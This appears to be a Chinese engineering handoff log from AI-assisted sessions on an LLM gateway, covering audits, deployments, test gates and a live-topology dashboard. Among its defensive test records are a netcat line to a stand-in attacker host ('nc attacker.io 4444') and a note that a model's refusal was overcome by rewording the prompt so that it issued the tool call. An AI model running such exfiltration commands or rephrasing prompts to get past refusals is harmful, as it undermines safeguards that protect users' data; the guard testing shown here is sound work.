  POST `/v1/chat/completions` 均正确返 401 `invalid_key`，匿名 GET 被中间件 401。
  **教训**：从「看到一个异常响应」到「这是缺陷」之间隔着变量隔离，探针必须逐个
  控制 HTTP 方法 / 路径 / 凭据再下结论。
~~**`/v1/models` 对任意 `sk-` 字符串开放**~~：`Bearer sk-totally-bogus` 能拿到
  全量 615 个模型清单，同一 token 在 `/v1/chat/completions` 上正确 401。
  **根因是委托链断了一节**：`middleware/auth_mw.go` 规定 sk-* 由各 handler 自行
  调 `KeyVerifier`（Rule 20 §2），`ModelsHandler` 从未接上，中间件为内部调用者开
  的门于是对外敞开。**r1017 已修**。排查这类问题记住：**中间件放行 ≠ 已鉴权**，
  凡是 `/v1/*` 路由都要确认对应 handler 自己调了校验器。

### 2026-10-11 午后批判式复核（收尾核验轮，提交 `3adc82dc7` 快进后）

对「已声称完成」逐条实物复核，四项实测发现，三项改写结论：

1. **生产已漂移到 `2533-3cac0431`，不再是本轮的 `2515-7dd0b4b67`**。
   active 端口 8781，`/readyz`、`/healthz` 正常。2533 是**他人** 10-11 01:39 构建、
   01:40 部署的（`deployment.json` verified_at=17:40:52Z），构建提交 `3cac0431`
   **不存在于任何可访问仓库**（本仓全历史、`-cursor`、`-5`、154 `/opt/llm-gateway-go-source`
   （旧快照 `565de1fe5`）、`/root/llm-gateway-go-session-v2`（HEAD `1e59ecf6`）均无），
   谱系无法 git 级判定。**五修复在 2533 中的证据链**：release 的
   `configs/sensitive_patterns.yaml` md5 `866c1064…` = `ce5e35ab3` 版
   （含 audit 244 F2 中缀连字符规则与注释；2026-10-11 时点 HEAD——此后 43c9f3ba4 等已再改该文件，现 HEAD md5 为 `b80d4655…`），
   而 `ce5e35ab3` 确认包含 `7dd0b4b67`，
   且时间线上五修复（10-10 08:23）远早于 2533 构建（10-11 01:39）——**配置层确认在，
   代码层时间线相容但无法直接核验**（构建提交无处可寻、二进制 stripped，无符号）。
   已排除的疑似源：本仓全历史、`-cursor`、`-5` 两个并发 checkout、154
   `/opt/llm-gateway-go-source`（旧快照）、`/root/llm-gateway-go-session-v2`
   （yaml 是 7 月老形态 `20b17bb…`，不含五修复，排除）。
2. ~~**r1016/r1017 未上生产是时间线事实**~~ —— **2026-10-11 21:00 实测推翻，已作废**。
   本条写入时（2533，01:39）属实，但 16:34 的 2537/2539 部署（`37099db2`）已把
   两者带上生产。**取证时踩了两个量具坑，都记在这里**：
   - **245 的 release 二进制叫 `gateway`，不叫 `llm-gateway-go`**；按后者
     `strings` 会报 No such file，看起来像「二进制不存在 / 被 strip」。本文件
     早前「245 是 stripped ELF」的结论据此作废——它有完整符号表（`go1.` 命中 3）。
   - **包级 `var` 不会留下 Go 符号名**（`egressHostFromBarePort`、
     `egressHostFromPort` 均为 0），**`const` 更没有**（`barePortFollower` 为 0）。
     拿符号名当指纹会得到假的「未包含」。可靠口径是 **rodata 里的正则字面量**
     （stripped 二进制也读得到）：`\s+(\d{1,5})`、`a-z0-9._%+\-]+@`、
     `0123456789>&|/` 三条在两台上均命中。
   待下次部署授权。
3. **`/tmp/154env.sh`（本机与 154）均已不存在**——E2E 测试台的网关凭据丢失，
   `api_keys` 表只存 `key_hash` 无明文可回收。**下次跑 E2E 前需先找用户要 key**
   （或用户侧重新签发）。数据库口径指标（851、ip_address、session_censors）不受
   影响照常可查。
4. **还原半程未生效的规模比此前记录大 48 倍**：`session_censors` 现有
   **601,914 行**（此前记录 12,417 行），`original_encrypted` 仍 **0 非 NULL**。
   `LLM_GATEWAY_SESSION_CENSOR_KEY` 仍未配置，且此前已确认配置它**不能**修复还原
   （无解密读取方）。每一条脱敏记录的还原目标都只活在 Redis TTL 里。

另：摘要挂账的三个历史后台任务（`bg_544e2535` / `bg_934c8bcd` / `bg_757367e1`）
在本地任务注册表中已不存在（not found），无法回读其输出——按批判原则，
它们的「succeeded」状态**不得**被转述为「已读取并确认」。

### 下一轮提示词（2026-10-12 深夜轮更新）

1. ~~r1016/r1017 生产复验~~ **已完成（深夜轮独立复验，非转抄 7d5efa21c）**：
   154=2547、245=2546 均含 r1016/r1017/r1018；models 伪造 token 401、
   ssh@IP/内网域名放行、npm install 放行、公网域名 403+`output_policy_blocked`、
   EOL 凭据 healthy 仅 binding 摘除——全部通过，详见
   `docs/audit/2026-10-12-深夜轮-r1018复验与拍板执行.md`。
2. ~~漂移绑定 + archive 42703 两项拍板~~ **已执行（深夜轮）**：漂移绑定清退 228 条
   （`model_probe_broken` 词汇，双备份表 `bak_20261011_drift_bindings{,_b}` 可逆，
   残留 0）；archive 42703 发现已被部署链修复（函数体含 gw_session_id），手动
   触发 `archive_request_logs_default(30)` 成功建出 `request_logs_archive_2026_08`。
3. ~~深夜轮三项代码收口已推送（394da3d12）待部署~~ **已上线（2026-10-12 凌晨轮）**：
   EOL 识别按 410 状态码、A2 量具 `/api/admin/anomaly-reporter/stats`、
   deploy-local 空 web/ refuse 门——随 154=2550-a87a134a / 245=2548-a87a134a
   上生产；A2 端点未授权 401 实测在场，fake token 401 回归通过。
4. ~~★ 重部署 154/245 使 UrsmlHealthyKeyReconciler 生效~~ **已完成（凌晨轮）**：
   154 经 2549→2550 两轮部署、245 由并行会话 2548 部署，两台日志均出现
   `ursm.v2 healthy-key reconciler started`（interval 1m0s），每轮 repaired
   24~133 个节点键并在收敛（133→54→38）。两台现同为 a87a134a（含 r1019：
   命令动词表收口 `nc attacker.io 4444`，实测 403 阻断且 r1018 的
   `node server.js 8080` 放行无回退）。
4. **probe_direct_auth_failed 是探针失败主体**（2546 上线后 30min 内 204 条，
   集中在 8/18/19 等凭据）——凭据 key 疑似真死，数据/配置层清退决策待 owner。
   失效 sk-* key 持有方通知（漂移文档 §三）仍未落地。审计统计一律用热表
   `request_logs_hot` 或按 `error_kind` 细分，别拿父表 `success` 列算比率。
5. **fail-open 占位符透传遗留缺陷**：96 行样本、真值零泄漏、中低危，根因未定位；
   推进需在 fail-open 分支加结构化日志 + 收集真实流量 + 另行发布授权。
6. **还原半程**：601,914 行 `original_encrypted` 全 NULL。若用户要还原功能，
   决策点是把 `db_sink.go` 加解密读取方（新代码）而不是配密钥（无读取方，
   配了也白配）。
7. 窗口外分支：远端 UNMERGED 剩 3 条承载独有内容的
   （`2026-07-25-realtime-routing-self-heal` 24 篇设计文档归档 +9536 行、
   `fix/w5-ml-ci-runbook` +327、`fix/w6-monitor-docs` +613），留置待维护者
   决定合并或放弃；已删 5 远端（3 条 patch-id 等价于 main、
   2 条 3 行过期 README 徽章同步）+ 2 本地已合并。
   **2026-10-13 窗口分支清理**（[1h,48h] 活跃窗，全部核验已合并后删除）：
   本地 4 条（`codex/client-setup-audit-20261012`、
   `codex/itestuu-ui-deploy-2543-20261012`、`codex/itestuu-ui-deploy-20261012`、
   `codex/backup-itestuu-pre-rebase-20261012`——其单提交 patch-id 等价于
   main `8404a3af6`；对应 worktree 的脏改动经逐字节比对就是该备份提交的
   rebase 前旧草稿，main 已演进超越，无独有内容）+ 连带移除 3 个残留
   worktree；远端 3 条（前两条 + `fix/full-test-20261011`）。
   `feat/deploy-211-docker` 最后提交 <1h（活跃，wt-deploy-211 在用）按窗口
   条件未动。本地现剩 main + `feat/deploy-211-docker`。
8. **批量操作量具坑（新增，判据纪律第 5 条）**：`node_probe_state` 被探针周期
   并发改写，READ COMMITTED 逐语句快照会在改写窗口读到半写状态（深夜轮第一批
   清退因此静默漏掉 cred 18/19 的 127 条——预览 234、执行 107，非数据变化）。
   凡以它为源的批量操作一律 REPEATABLE READ 单快照 + 双时间点复验。

## 已完成（已推送）

1. `1127a3e3c`：合并主提交 + 冲突解决（`admin/dashboard_board_queries.go` 保留上游降级契约 + 探针排除积分源）
2. `df69ef0be`：`scripts/deploy-local-lib.sh` macOS timeout 可移植性修复（`timeout → gtimeout → 纯 bash 轮询看门狗`，轮询实现避免子 shell sleep 孙进程变孤儿拖满时限）
3. `7fd9b2ceb`：`tests/deploy_timeout_portability_test.sh` 回归门接入 `verify.sh`；7 套 deploy-local 测试 `rc=0`；变异验证确认有牙
4. `22e5e3f8f`：`scripts/deploy-lib` 软链 SSOT 路径迁移（`ai-native-tools/deploy-lib` → `ai-native-workspace/deploy-lib`，与本机实际 SSOT 一致）
5. `7817f1c1a`：审计 pass（2026-10-10 23:30）——`go build`/`go vet`/`security/*`+`streaming/*` 9 包全绿；**第九之二节「占位符 fail-open 透传」经 9 种拼写变体探针复验确认已不复现**（当前 HEAD 全程 fail-closed），该节结论已更正；仓库卫生干净。审计结论详见 `docs/audit/2026-10-10-sanitize-e2e-154-multimodel-report.md` 第二十节
6. **2026-10-11 审计 pass（24h 修正任务审计与完善）**，详见 `docs/audit/2026-10-11-24h-audit-pass.md`。拉取 `182ce34b1`（6 提交）快进合并后，发现并修复三族问题：
   - **installer 五点同步缺口**：851 缺 main.go go:embed/map 登记（e47c1102b 只做了半个同步）、849/850 完全没同步——补齐后重新生成 `sql/schema/installed_startup_migrations.tsv`，installer 模块 13 包全绿；
   - **通道腿整段漏登 845-851**（存量八连红）：按 842 先例补登进 `scripts/apply-db-revision-sequence.sh` 的 files 数组，`apply-db-revision-sequence_test.sh` rc=0；
   - **admin 过时测试 vs authz-first**：4b06bd50b（窗口内）给 `handleUsers` 加路由级 `requireUserManager` 后漏改 2026-06-28 的两个旧断言——改为「未授权 403 + 已授权 400/405」双断言，admin 子集仅剩已知负向闸门红。
   - 另实测：`./domains-stats/...` 是本文件历史笔误（git 全历史无此路径，实为 `./domains/stats/...`），已在本文件更正；web-mobile 7169 / web 2401 前端测试全绿。
7. **2026-10-11 下午本地部署审计轮**（本会话）。拉取 7 提交快进后审计本机
   host-first 部署，修复四族问题并重新部署 2.5.8.2538：
   - **孤儿网关**：2533 轮遗留 4 个跨版本孤儿（PPID=1、无监听、两个以
     pool-closed 半死态刷错误日志 12h+）。根因是 `stop_instance` 只发 TERM
     不等待且 cutover 重试后旧 pid 失去 pidfile 引用。修复：TERM→轮询(10s)
     →KILL 升级 + 部署收尾 `reap_stray_gateways`（模式锚定部署根，不误伤
     其他 checkout）；行为回归门 `tests/deploy_local_reap_test.sh` 已接入
     verify.sh（zombie-aware 判活；三个变异验证全红在正确断言）。
   - **迁移 517 在 host-first 从零建库必炸**：534 重建后 `handoff_logs` 是
     RANGE(created_at) 分区父表，PG 不允许不含分区键的唯一约束，517 的
     `REFERENCES handoff_logs(id)` 必然 `no unique constraint`（生产是
     「先 517 后 534」的历史顺序才没炸）。修复：FK 改 DO 块按 relkind 形态
     探测——分区父表引用 `handoff_logs_hot(id)`，heap 形态保持
     `handoff_logs(id)`；canonical 与 installer embeddata 双点同步；两种
     形态 + fail-fast + 幂等四项验证通过。
   - **环境漂移**：`~/.ssh/config` 丢失（245/154/252 别名全失效，`ssh 252`
     会被解析成 IP 0.0.0.0.252）——已从
     `ai-native-workspace/docs/win11/ssh-config-fleet.txt` 恢复；
     `~/sdk/bash5` 被清——已重编（psize.sh 固定 PIPESIZE 65536 的坑再次确认）。
   - **部署轮验证**：2538 上线后 127.0.0.1:8782 / mesh 8782 / mesh 8443
     (caddy) / 公网 443 SNI→252:9443→mesh 8782 四入口全绿，**收尾零孤儿
     进程**（新机制首次实战生效）。
8. **2026-10-12 深夜轮**（r1018 生产复验 + 两项拍板执行 + 分支裁决），详见
   `docs/audit/2026-10-12-深夜轮-r1018复验与拍板执行.md`：
   - 独立复验 2546/245 + 2547/154 全通过（复验矩阵见审计文档 §二）；
   - 漂移绑定清退 228 条（0 残留，双备份表可逆）；archive 42703 已被部署链
     修复，手动触发归档验证通过；
   - 三项代码收口（EOL 按 410 状态码 / A2 admin 端点 / refuse 门）已推送
     394da3d12，**待下次部署**；
   - 分支裁决：删 5 远端 + 2 本地，留 3 条独有内容远端；
   - 新增量具坑：`node_probe_state` 并发改写窗口读半写（判据纪律第 5 条）。
9. **2026-10-12 r1019 轮**（netcat 系外传缺口收口 + 两台生产上线），详见
   `docs/audit/2026-10-10-已还原值被输出合规销毁.md` 末尾 r1019 小节：
   - **245 = `2548-a87a134a`**（8781）、**154 = `2551-a87a134a`**（8781）。
     两台均含 r1019；**全路径端到端各 14/14 通过**（真实模型 `glm-4.5-flash`、
     `tool_choice` 强制）。此前 r1018 刻意留下的 `nc attacker.io 4444` 残留缺口已收口。
   - **假绿实例（判据纪律第 3 条的又一次实证）**：`nc attacker.io 4444` 首轮返 200，
     看着像没拦住，实为模型在**散文里自行拒绝**、压根没发起 tool call——
     「看不见」与「没拦」被混为一谈。换顺从措辞后复测 → BLOCK 403。
     **每次「放行」都要单独判前提是否在场。**
   - **判别实验**：同一句命令，不给 `tools` → 200 不拦；给 `tools` 且强制调用 →
     403 `output_policy_blocked`。守卫作用域确认是 **tool 参数**，不是提示词文本。
   - **部署纪律新增（本轮踩到）**：`scripts/deploy-seamless.sh` **必须用
     `$HOME/sdk/bash5/bin/bash` 跑**（系统 bash 3.2 的 `${target^^}` 会报
     bad substitution）。且它在报错前**已经先在远端建好了 deploy.lock**，
     于是留下一把**孤儿锁**让下一次部署直接失败。判陈旧锁要看
     `lock/metadata` 的 `started_at` + 持有 pid 是否还活着，不能只看报错文案。
   - **本机没有 `sops`**，`envs/loader.sh --mode=enc` 解不开 `.env.secrets.enc.yaml`，
     取 `LLM_GATEWAY_ADMIN_*` 只能从目标机运行时 `/opt/llm-gateway-go/.env` 拿。
   - 并发会话提醒：154 上曾出现**另一份 checkout 在部署**（seq 2550 已落盘未切流）。
     **没清活锁**、等它结束后自查版本再部署——否则会把「对方已落盘的 release」
     误当成「自己已上线」。
10. **2026-10-16 实时拓扑新首页 `/live`**（方案 + 实现，**未部署**），详见
    `docs/03-design/02-feature-design/features/live-topology-home-design.md`：
    - **旧首页零改动**：`/` 与 `/dashboard`、四个 tab、URL 契约一行未动；新页
      `/live` 作为独立导航项放在「总览」之前（2026-10-16 owner 拍板）。
    - **数据面几乎全复用既有 SSE**：请求/节点健康/队列/路由判定都来自
      `/api/admin/live-stream`（`liveStreamStore`）；新增后端端点**只有一个**：
      `GET /api/admin/topology/providers-today`（`admin/topology_providers_today.go`），
      口径与 `/api/admin/stats/*` 同源（`stats_usage_daily`），租户隔离走
      `statsTenantScope`。
    - **当天统计 = UTC 日桶且显式标注水位**：该聚合表由 `DailyMonthlyRollup`
      **每小时**重建，响应带 `day_utc` + `source_high_watermark` + `rollup_cadence`，
      左栏必须画出来——把 ≤1h 滞后的数字装成实时是本仓反复吃过的亏。
    - **供应端按凭据级节点**（owner 拍板）：node_update 本就凭据级（熔断/配额/
      在途/延迟），才能指出「哪一把 key 坏了」；过滤下拉同时给「供应商整体」与
      「单把凭据 `code #id`」两种口径。
    - ★ **新判据纪律：pgxmock 不执行 SQL ⇒ 行级判据对 SQL 形态改动是假绿**。
      把 `LEFT JOIN providers` 改成 `JOIN`（未知供应商桶被静默丢弃），5 条行级
      判据**全绿**。必须另配钉在 SQL 常量上的契约判据
      （`TestProvidersTodaySQLContractPinsJoinAndTenantGuard`），已做变异验证。
    - 变异验证共 9 处：后端 5（租户作用域/降级分支/INNER JOIN/租户守卫/日桶口径）、
      前端 4（未上报健康被画绿、布局用 `Math.random`、过滤恒真、粒子按帧数推进）、
      另有 2 处验证三栏收敛（右栏绕过过滤、图侧绕过过滤）。
    - 前端纯函数在 `web/src/lib/liveTopology*.ts`（构图/确定性布局/过滤/粒子池），
      编排 `web/src/composables/useLiveTopology.ts`，视图
      `web/src/views/LiveTopologyView.vue` + `components/live-topology/*.vue`。
      **三栏（图/左栏/右栏）必须收敛到同一过滤子集**，由视图判据钉住。
    - 顺带修一个既有类型缺口：TS `LiveRequest` 缺 `canonical_name` / `credential_id`
      / `credential_label` 三个字段（Go 侧一直有），补在 `liveStreamStore.ts`。
    - DEV 夹具预览页 `/dev/live-topology-preview`（同 `DispatchWaterfallPreview`
      的既有做法，生产不注册）用于无登录态时肉眼验走动效。
    - **未完成**：真实浏览器验收被沙箱挡下（见「剩余任务」第 8 条）。
11. **2026-10-17 实时拓扑 `/live` 改版（owner 四点拍板，未部署）**：
    - **① 网关收成一个「大方块」**：缓存 / 脱敏 / 路由 / 节点状态管理 /
      会话数据文件存储 / 数据会话写入 / 错误记录 / 探测任务 / 任务识别，
      按处理顺序排成 3×3 九格（`GATEWAY_MODULES`）。**后三格是旁路**，
      虚线 + 降透明（`GATEWAY_BRANCH_MODULES`）—— 画成实线会被读成
      「每个请求依次走完九步」。网关层不再是图上的一个小节点，
      改由 `computeGatewayBox()` 给出的整块几何承载（`GatewayCoreBox.vue`）。
    - **② 流程左→右改上→下**：层中心线 `client .09 / gateway .50 / provider .74 /
      model .93`；`computeLayout` 不再为 gateway 列生成小节点。
    - **③ 左客户端请求、右供应商响应、可点击放大**：左栏先聚合摘要再逐条明细；
      右栏只含**已派发到供应端**的请求，点 ⤢ 打开**内联覆盖面板**
      （不用 el-dialog/el-drawer：遮挡拓扑 + ui-audit 对弹层有形态契约）。
      左下保留供应商当天统计（UTC 日桶 + 水位）。
    - **④ 顶部四维多选**（客户端/供应商/模型/节点）：**同维 OR、跨维 AND、
      空选不过滤**，语义写在 `liveTopologyFilter.ts` 顶部；URL 用逗号分隔串往返。
    - **本轮修掉的四个真问题**（都不是改版本身引入的，是改版把它们照出来）：
      1. `GraphRequestInput.request_type` 字段名错（线上是驼峰 `requestType`）
         → 「任务识别」模块恒为 0，**正是本仓禁止的假零**；已加 ★ 判据；
      2. 网关大方块**标题压住第一行模块**（3×3 网格从 `pad=10px` 就开始，
         而标题是正常流的 `.gw__head`）→ 布局函数预留 `header=28px` 标题带；
      3. 网关大方块**底边压住供应端节点卡 2px**（`hRatio 0.42` → `0.40`）；
         净空 = 比例量 − 固定像素量，**随画布高度变化**，判据扫了 5 个高度；
      4. 右面板**漏了探测流量标记**（左栏有 `is-probe`，右栏没有）。
    - ★ **本轮新增的三条判据纪律**（详见设计文档 §13.3）：
      - **「规则恒真」是假绿的头号来源**：右面板「只含有节点的请求」这条规则，
        在「三条夹具都带凭据」时**恒为真** —— 删掉整个过滤逻辑全部判据依然全绿
        （变异 M8 实测）。凡有「排除某类」的规则，夹具里必须有一条
        **恰好命中该排除条件**的样本；
      - **判据的输入参数要选能区分的那一组，不是能跑的那一组**：旧 `hRatio=0.42`
        在 `height=700` 下恰好「正好相接」，只有换到 `height=620` 才暴露 2px 重叠；
      - **肉眼验收要盯「渲染物」不是盯「代码」**：上面 2、3 两个重叠都是靠
        **重新生成布局快照并逐格核对**发现的，单测全绿时它们已存在。
    - 变异验证本轮 **11 处全变红**（M1 同维 OR 退化 / M2 节点维失效 /
      M3 任务类型读错字段 / M4 纵向塌平 / M5 网关不方 / M6 旁路画成主链路 /
      M7 缺省渲染成 0 / M8 右面板绕过节点过滤 / M9 统计忽略时间窗 /
      M10 大方块压节点卡 / M11 不预留标题带）。
    - **删除** `RequestStreamStrip.vue`（被左右两栏取代）与 `liveTopology.strip.*`；
      `RoutingDecisionTimeline.vue` 保留（底部判定时间线仍是常驻入口）。
    - 顺带补齐上游 `e982d99c9` 漏译的 6 个 locale nav 键
      （`item.sessionAnalyticsFilterOptions`）—— 该缺陷来自上游合并，
      与本轮无关（工作区零 nav 改动，git 溯源确认），但会让 parity 测试红。
    - **浏览器验收：2026-10-18 凌晨已完成**（此前挂着「被沙箱挡下」）。
      关键认识：**验收不必走生产 `/live`**——那条路要管理员凭据。
      用仓库自带的 `/dev/live-topology-preview`（`import.meta.env.DEV` 才注册，
      `meta:{public:true}` 免登录）+ `/tmp/dev-topology-stub.mjs`（API 桩）
      + `vite --port 5199` 指向桩，即可真实渲染。详见下方「浏览器验收轮」。

## 浏览器验收轮（2026-10-18 凌晨，/live 展示诚实性修复的像素级确认）

**验收环境**（都不需要任何凭据，下次照抄即可）：
```
node /tmp/dev-topology-stub.mjs 5198                      # API 桩
cd web && GATEWAY_API_TARGET=http://127.0.0.1:5198 \
  corepack pnpm vite --port 5199 --strictPort             # dev server
# 打开 http://localhost:5199/dev/live-topology-preview
```
（桩在 `/tmp`、不进仓库；vite 只听 IPv6 回环，探活要用 `localhost` 不是 `127.0.0.1`。）

**两条与工具有关的坑，下次直接绕开**：

19. **本仓 FilePanel Browser 的 `screenshot` 对这页不可信**：抓到的是黑底空图，
    而 `query(kind:'dom')` 同时能读到完整的 `.live-topology` 结构、控制台零报错。
    ⇒ **判定「元素在不在」一律用 DOM/文本查询，不要用截图**；截图只用来在
    **已成功渲染过的那一张**上做视觉判断。差点据此误判成「页面挂了」。
20. **`query(kind:'editable')` 不接受 `selector`**（只有 text/dom 接受），
    查可交互元素要用 `kind:'semantic'` + 精确可见文本。

**像素/结构级确认到的（DOM 实读，非推断）**：

| 项 | 观察到的值 | 意义 |
|---|---|---|
| 网关九格 | `缓存 0 / 脱敏 76 / 路由 76 / 节点状态管理 4 / 会话文件 0 / 会话写入 0 / 错误记录 9 / 探测任务 9 / 任务识别 0` | 缓存=0 是 `is-idle` 而**非 `is-error`**，错误记录=9 才转红 —— 本轮 BLOCKER 修复在真实渲染下成立（夹具恰好无 cache token，正踩中修复前会误显红的那条路径） |
| 放大面板几何 | 关闭按钮 `x=525`，右列右边缘 ≈552 | 面板**被约束在右列内**，未退到视口 —— 定位基准修复生效 |
| 缺省时延 | 列表渲染 `—`（不是 `0ms`） | 假零禁令在面板层也成立 |
| 左栏表头 | `4`，与实际 4 行一致 | 「8 / N」计数修复生效 |
| 连接状态 | `已连接` | 预览页夹具注入器在持续喂数据（时间戳实时推进），页面是活的 |

**仍未由像素确认的**（如实记，不要当已验）：独立审计提的
**480 断点右侧裁切**（`TopologyCanvas.vue:277` 强制 `width≥640` 而容器 `overflow:hidden`）
只做了 CSS 数值推导与布局函数计算，**没有在 480px 视口下真的截过图**。
本次验收视口约 1144px（窄屏单列），未覆盖到 480。需要的话把 Browser 视口调到 480 再验一次。


## 剩余任务（按依赖顺序）

0.0. ★ **合并上游 `1a97a17cb`（9 提交）后，两道门由上游带红，本轮如实记录、未擅自处置**。
    取证方式：**`git worktree add /tmp/lgw-origin-main origin/main --detach` 在 pristine
    上游树复跑**，两条判据在上游自己就红（不是本轮引入，也不是「我改的文件没重叠」
    那种弱证据）：

    | 门 | 上游 pristine | 本分支合并后 | 性质 |
    |---|---|---|---|
    | `navCoverage.test.ts` | 红：`/admin/usage-enhanced`、`/admin/board-operational` 两条孤儿路由 | 同红 | 上游新增路由未挂菜单、未登记 `KNOWN_ORPHANS` |
    | `hardcoded_cjk.baseline.test.ts` | 红：`5565 > baseline 5529` | 红：`5566` | 上游 9 提交把硬编码中文从 5511 抬到 5565 |

    **2026-10-17 审计轮更新（数字又推进了，且本轮净贡献归零）**：
    - 硬编码中文现为 **5757**，棘轮 `INCREASED by 228`。取证方式升级为
      **`git stash push -u` 后原地复跑**：移除本轮全部改动后仍是
      `5757 / baseline 5529 / +228`，与带改动时**逐位一致**
      ⇒ 本轮改动对硬编码中文**净贡献 0**（比上轮的 +1 还收窄了 1：
      新增 i18n 键后那几个字不再硬编码）。
    - `color:check` 也转红（`StorageMigrationStateView.vue:166` 两处、
      `SubscriptionTiersView.vue:97` 一处硬编码色值），同样 stash 后仍红。
    - `i18n/parity.test.ts` 报缺 `nav.item.*` 六键 × 6 locale
      （`opsOverviewWeb` / `requestActions` / `storageAndLogConfig` /
      `storageMigrationState` / `subscriptionTiers` / `turnsFilterOptions`），
      全是**上游新增菜单项**未翻译，与 `liveTopology` 模块无关。
    - 上述 4 条在 **`git worktree add /tmp/pristine-live HEAD`** 的 pristine
      树上复跑同样红 —— 强证据，不是「文件没重叠」那种弱证据。

    **2026-10-18 更新：`i18n/parity` 已关（4 条 → 2 条）**。
    补齐上游漏译的 6 组 nav 键 × 6 locale（zh-TW/ar-SA/de-DE/es-ES/fr-FR/ja-JP），
    parity 由红转绿。**这批不需要 owner 拍板**：是上游漏了翻译，
    补齐属于「把上游没做完的做完」，不改变任何产品行为。
    ⇒ 剩余 2 条**仍然都要 owner 拍板，不要代做**：
    - `navCoverage`：这 6 条路由（`/admin/usage-enhanced`、`/admin/board-operational`、
      `/admin/ops-overview`、`/admin/subscription-tiers`、`/admin/request-actions/:id`、
      `/admin/storage-and-log-config`）**不在 appNav、也未登记 KNOWN_ORPHANS**。
      挂不挂菜单 = 这批页面要不要进导航栏，是产品决策。
      **注意它们正是刚补译的那 6 组菜单项** —— 上游加了路由和文案却忘了挂入口，
      两处缺陷同源（补翻译时顺带查到了 navCoverage 的具体清单）。
    - `hardcoded_cjk` 棘轮 5757 vs 5529：要么改 228 处走 i18n，
      要么手动抬基线，两者都是策略决策。

    - 本分支对第二条的净贡献是 **+1**，且**不可消除**：`appNav.ts` 新增导航项的
      `label: '实时拓扑'`。实测该计数器**按构造计数而非按字符**
      （`{label:'实时拓扑'}` = 1，源码注释被 mask = 0），所以这不是「写了几个中文字」
      的问题，是新增一个导航入口的固有成本。
    - **两条都需要 owner 拍板，本轮不代做**：
      ① 孤儿路由要么在 `appNav.ts` 挂菜单入口（会改可见导航，是产品决策），
      要么登记 `KNOWN_ORPHANS` 并写明理由；② 硬编码中文棘轮要么把上游那 54 个
      改走 i18n，要么 `node scripts/i18n-cjk-count.mjs --update-baseline`
      手动抬基线（脚本注释明说基线是「清完一批后手动降棘轮」用的）。
      本轮只做了**确定无争议**的那部分：补齐上游漏译的 nav locale 键
      （`sessionAnalyticsFilterOptions` / `usageEnhanced` / `boardOperational`
      共 3 组 × 6 locale），那不涉及任何产品或策略判断。

~~0. **陈旧分支清理（窗口外遗留，下轮顺手项）**~~ **已完成（2026-10-12 深夜轮）**：
`fix/sanitize-mutation-tolerant-restore-v2` 与 `fix/sanitize-hop-passthrough`
均已 `git branch -d` 删除（当时确认已合并）；2026-10-13 轮又清掉 [1h,48h]
窗内 4 本地 + 3 远端已合并分支（裁决详情见「下一轮提示词」第 7 条），
本地仅剩 main 与活跃的 `feat/deploy-211-docker`。

### 任务 1 — 编译 / vet / gofmt / 单元测试

**前置**：`export PATH="$HOME/sdk/go/bin:$PATH"`（Go 1.27.1 已就位，无需安装）。

```bash
go build ./...
go vet ./...
gofmt -l <你改的文件>                    # 无输出即过
CGO_ENABLED=0 go test \
  ./security/... ./domains/outputcompliance/... ./domains/streaming/... \
  ./proxy/... ./settings/...
```

> **注意**：原文档写的 `./domains-stats/...` 在本仓库**不存在**
> （`lstat ./domains-stats/: no such file or directory`），别照抄。
>（2026-10-11 审计核实：git 全历史无此路径，实为 `./domains/stats/...`，
> 该包实测 ok；admin/bg 子集另见「已完成」第 6 条。）
>
> **`gofmt -l .` 有大量存量未格式化文件，这是上游长期状态，不是你的回归。**
> 不要全量格式化——巨型 diff 会在多会话共享仓库里制造冲突面。
>
> **已知失败（与改动无关，先在 pristine `origin/main` 上复现再判定）**：
> `admin` 的 `TestV1BodiesReadersAreAssessed`（维护者故意红的负向闸门，判据是
> 「登记表覆盖全部 bodies 读方」）、`domains/hooks/handoff` 的
> `Test244WideningRuleShrinksGap`。~~`TestHandleUsersPasswordRoute_Rejects*`
> （2 条）~~ **这两条已在 2026-10-11 审计 pass 修复**（4912b212b：根因是
> 4b06bd50b 给 `handleUsers` 加路由级 authz-first 后漏改 2026-06-28 的旧断言，
> 生产行为正确、测试过时；现改为「未授权 403 + 已授权 400/405」双断言）。
> `verify.sh` 在 `set -e` 下无条件 `go test ./...`，因此主门长期为红是
> 维护者策略，不要改 CI 或加白名单。
>
> **CGO 边界**：`CGO_ENABLED=0` 只适用于上面的子集。`./cmd/...`（含
> cmd/gateway 的 lite 存储测试）与 `./db/...` 需要 **CGO 开启**（SQLite 驱动
> 在 CGO_ENABLED=0 下报「lite 存储模式需 CGO 构建」），直接 `go test` 即可。
>
> **2026-10-14 已把口径钉进 `verify.sh`**：文件顶部按**宿主**划界——
> `if [[ "$(uname -s)" == "Darwin" ]]; then export CGO_ENABLED="${VERIFY_CGO_ENABLED:-0}"; fi`
> （macOS 强制 cgo=0；Linux/CI 上一个字节都不改——cgo=0 会让那 6 个 lite/sqlite
> 包的用例整片红，`driver_nocgo.go` 是按设计 panic 的；macOS 上要强制 cgo 用
> `VERIFY_CGO_ENABLED=1`）。实测依据：同一 commit、同一台机，`go build ./...`
> → RC=1（121 行 `tapi error: malformed file`），`CGO_ENABLED=0 go build ./...`
> → RC=0，`CGO_ENABLED=0 go vet ./...` → RC=0。cgo=0 下必然红的 6 个包（依赖闭包
> 实测）：`bg`、`cmd/gateway`、`storage`、`storage/factory`、`storage/sqlite`、
> `tests/integration`——**verify.sh 不剔除它们**（AGENTS 既有策略：主门长期为红是
> 维护者决定，不要加白名单），真实覆盖由 CI 的 cgo=1 承担。回归门
> `tests/verify_cgo_convention_test.sh`（已接入 verify.sh 首块）钉住：Darwin 划界
> 还在（并**行为**验 Linux 上不被钉、覆盖口真能用）、注释里的实测证据不被删、
> `go test ./...` 没被缩小、编译结果不过管道、sqlite 双形态驱动都在、6 包名单不漂移。

**已验证绿的子集**（2026-10-11 审计实测，`CGO_ENABLED=0 go test`，rc=0）：

| 包 | 耗时 |
|---|---|
| `security/sanitize` | ~5s |
| `security/armor` `guardian` `sensitive` | ok |
| `domains/outputcompliance` | ~0.5s |
| `domains/streaming` | ~168s |
| `domains/streaming/executors` | ~51s |
| `proxy` / `settings` | ok |
| `domains/streaming/{integrity,state,executors/webcookie}` | ok |

sanitize / streaming 这条线在当前 HEAD 是全绿的，可直接作为改动后的回归门。

**已知故意红的负向闸门，不要修复也不要加白名单**（维护者策略）：

- `admin/request_logs_bodies_retirement_gate_test.go` 中的 `TestV1BodiesReadersAreAssessed`：27 文件 / 39 调用点，故意红，判据是「登记表覆盖全部 bodies 读方」。

**主门长期红的原因与对策**：

